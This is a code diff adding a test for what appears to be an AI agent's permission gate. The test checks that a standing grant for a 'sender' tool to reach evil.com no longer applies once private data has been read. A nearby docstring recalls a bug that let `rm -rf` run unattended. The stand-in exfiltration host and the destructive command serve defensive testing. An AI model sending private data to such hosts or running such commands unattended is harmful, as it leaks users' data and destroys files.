@@ -371,6 +371,24 @@ async def test_gate_warnings_are_never_covered_by_grants(tmp_path: Path):
     assert asks(ui) == 2
 
 
+async def test_gate_grants_do_not_cover_tainted_egress(tmp_path: Path):
+    ui = ScopedUI(scope="always")
+    gate = Sentinel(
+        SentinelSettings(always_ask_tools=["sender"]), AuditLog(tmp_path / "a.jsonl"), ui
+    )
+    gate.grants.add("sender", "evil.com", "session")
+    # before anything private is read, the standing grant settles the call
+    await gate.guard(call("sender", host="evil.com"), Sender())
+    assert asks(ui) == 0
+    # once the conversation is tainted, the same grant no longer settles it
+    await gate.guard(call("reader"), Reader())
+    result = await gate.guard(call("sender", host="evil.com"), Sender())
+    assert asks(ui) == 1 and result.ok
+    ui.approve = False
+    result = await gate.guard(call("sender", host="evil.com"), Sender())
+    assert asks(ui) == 2 and not result.ok
+
+
 async def test_gate_auto_mode_still_asks_on_warnings(tmp_path: Path):
     """Policy step 6 keeps a call with a warning an ASK in auto mode; the gate used to
     turn every ASK into ALLOW there, so `rm -rf` ran unattended."""
